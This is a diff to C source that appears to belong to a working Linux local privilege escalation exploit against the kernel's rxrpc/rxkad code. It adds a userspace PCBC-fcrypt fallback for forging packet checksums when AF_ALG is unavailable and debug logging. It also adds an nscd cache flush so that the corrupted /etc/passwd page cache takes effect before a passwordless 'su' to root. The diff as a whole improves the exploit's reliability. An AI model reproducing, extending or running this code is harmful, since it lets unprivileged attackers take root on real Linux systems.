@@ -618,6 +618,9 @@ static int alg_op(int alg_s, int op, const uint8_t iv[8],
 	return 0;
 }
 
+static int pcbc_fcrypt_encrypt_userspace(const uint8_t key[8],
+		const uint8_t iv[8], const void *in, size_t inlen, void *out);
+
 /* Compute conn->rxkad.csum_iv (ref: rxkad_prime_packet_security):
  *   tmpbuf[0..3] = htonl(epoch, cid, 0, security_ix)  (16 B)
  *   PCBC-encrypt(tmpbuf, IV=session_key) → out[16]
@@ -626,14 +629,34 @@ static int alg_op(int alg_s, int op, const uint8_t iv[8],
 static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
 		const uint8_t key[8], uint8_t csum_iv[8])
 {
-	int s = alg_open_pcbc_fcrypt(key);
-	if (s < 0) return -1;
+	fprintf(stderr, "[dbg] compute_csum_iv: epoch=%u cid=%u sec_ix=%u\n",
+			epoch, cid, sec_ix);
+	fflush(stderr);
+
 	uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
 	uint8_t  out[16];
-	int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
-	close(s);
-	if (rc < 0) return -1;
+
+	int s = alg_open_pcbc_fcrypt(key);
+	if (s >= 0) {
+		int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
+		close(s);
+		if (rc == 0) {
+			memcpy(csum_iv, out + 8, 8);
+			return 0;
+		}
+	}
+
+	fprintf(stderr, "[!] socket(AF_ALG): %s\n", strerror(errno));
+	fprintf(stderr, "[dbg] compute_csum_iv: AF_ALG unavailable (s=%d), using userspace\n", s);
+	fflush(stderr);
+
+	if (pcbc_fcrypt_encrypt_userspace(key, key, in, 16, out) < 0)
+		return -1;
 	memcpy(csum_iv, out + 8, 8);
+	fprintf(stderr, "[dbg] compute_csum_iv: userspace result csum_iv=");
+	for (int i=0;i<8;i++) fprintf(stderr, "%02x", csum_iv[i]);
+	fprintf(stderr, "\n");
+	fflush(stderr);
 	return 0;
 }
 
@@ -647,19 +670,36 @@ static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
 		const uint8_t key[8], const uint8_t csum_iv[8],
 		uint16_t *cksum_out)
 {
-	int s = alg_open_pcbc_fcrypt(key);
-	if (s < 0) return -1;
+	fprintf(stderr, "[dbg] compute_cksum: cid=%u call_id=%u seq=%u\n",
+			cid, call_id, seq);
+	fflush(stderr);
+
 	uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
 	x |= seq & 0x3fffffff;
 	uint32_t in[2] = { htonl(call_id), htonl(x) };
 	uint32_t out[2];
-	int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
-	close(s);
-	if (rc < 0) return -1;
+
+	int s = alg_open_pcbc_fcrypt(key);
+	if (s >= 0) {
+		int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
+		close(s);
+		if (rc == 0) goto done;
+	}
+
+	fprintf(stderr, "[!] socket(AF_ALG): %s\n", strerror(errno));
+	fprintf(stderr, "[dbg] compute_cksum: AF_ALG unavailable, using userspace\n");
+	fflush(stderr);
+
+	if (pcbc_fcrypt_encrypt_userspace(key, csum_iv, in, 8, out) < 0)
+		return -1;
+
+done:
 	uint32_t y = ntohl(out[1]);
 	uint16_t v = (y >> 16) & 0xffff;
 	if (v == 0) v = 1;
 	*cksum_out = v;
+	fprintf(stderr, "[dbg] compute_cksum: result cksum=%04x\n", v);
+	fflush(stderr);
 	return 0;
 }
 
@@ -1107,6 +1147,66 @@ static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
 	memcpy(out + 4, &R, 4);
 }
 
+/* Userspace fcrypt encrypt matching kernel's fcrypt_encrypt.
+ * NOTE: round pairs are SWAPPED vs fcrypt_user_decrypt — the kernel
+ * encrypt starts with F_ENCRYPT(R, L) while decrypt starts with
+ * F_ENCRYPT(L, R).  Bug found via test harness on AF_ALG. */
+static void fcrypt_user_encrypt(const fcrypt_uctx *ctx,
+		uint8_t out[8], const uint8_t in[8])
+{
+	uint32_t L, R;
+	memcpy(&L, in, 4);
+	memcpy(&R, in + 4, 4);
+	FC_F(R, L, ctx->sched[0x0]);
+	FC_F(L, R, ctx->sched[0x1]);
+	FC_F(R, L, ctx->sched[0x2]);
+	FC_F(L, R, ctx->sched[0x3]);
+	FC_F(R, L, ctx->sched[0x4]);
+	FC_F(L, R, ctx->sched[0x5]);
+	FC_F(R, L, ctx->sched[0x6]);
+	FC_F(L, R, ctx->sched[0x7]);
+	FC_F(R, L, ctx->sched[0x8]);
+	FC_F(L, R, ctx->sched[0x9]);
+	FC_F(R, L, ctx->sched[0xa]);
+	FC_F(L, R, ctx->sched[0xb]);
+	FC_F(R, L, ctx->sched[0xc]);
+	FC_F(L, R, ctx->sched[0xd]);
+	FC_F(R, L, ctx->sched[0xe]);
+	FC_F(L, R, ctx->sched[0xf]);
+	memcpy(out, &L, 4);
+	memcpy(out + 4, &R, 4);
+}
+
+/* Userspace PCBC(fcrypt) encrypt for one or two 8-byte blocks.
+ * Returns 0 on success, -1 on failure.
+ * IV must be 8 bytes. in/out length must be 8 or 16. */
+static int pcbc_fcrypt_encrypt_userspace(const uint8_t key[8],
+		const uint8_t iv[8], const void *in, size_t inlen,
+		void *out)
+{
+	fcrypt_uctx ctx;
+	fcrypt_user_setkey(&ctx, key);
+
+	uint8_t c[16], p[16];
+	const uint8_t *pin = (const uint8_t *)in;
+	uint8_t *pout = (uint8_t *)out;
+	uint8_t chain[8];
+	memcpy(chain, iv, 8);
+
+	size_t blocks = inlen / 8;
+	for (size_t b = 0; b < blocks; b++) {
+		/* P = plaintext block, C = ciphertext block */
+		memcpy(p, pin + b * 8, 8);
+		/* PCBC encrypt: C = E(P ^ chain) */
+		for (int i = 0; i < 8; i++) p[i] ^= chain[i];
+		fcrypt_user_encrypt(&ctx, c, p);
+		memcpy(pout + b * 8, c, 8);
+		/* chain = P ^ C */
+		for (int i = 0; i < 8; i++) chain[i] = p[i] ^ c[i];
+	}
+	return 0;
+}
+
 /* For the 2-splice chain we want the line to have EXACTLY 6 ':' and a
  * shell field that equals "/bin/bash" (in /etc/shells, valid path).
  * The two splices interlock as:
@@ -1505,6 +1605,18 @@ int rxrpc_lpe_main(int argc, char **argv)
 		const char *e = getenv("DIRTYFRAG_CORRUPT_ONLY");
 		if (e && *e == '1') co_flag = 1;
 		if (co_flag) return 0;
+	}
+
+	/* Flush nscd passwd cache so pam_unix sees the corrupted page cache,
+	 * not a stale cached entry.  Critical on distros with nscd active. */
+	{
+		int st = system("systemctl is-active --quiet nscd 2>/dev/null");
+		if (st == 0) {
+			fprintf(stderr,
+				"[*] nscd active — invalidating passwd cache\n");
+			fflush(stderr);
+			system("nscd --invalidate passwd 2>/dev/null");
+		}
 	}
 
 	/* === STAGE 4 — `su` (target=root, no password input) ===
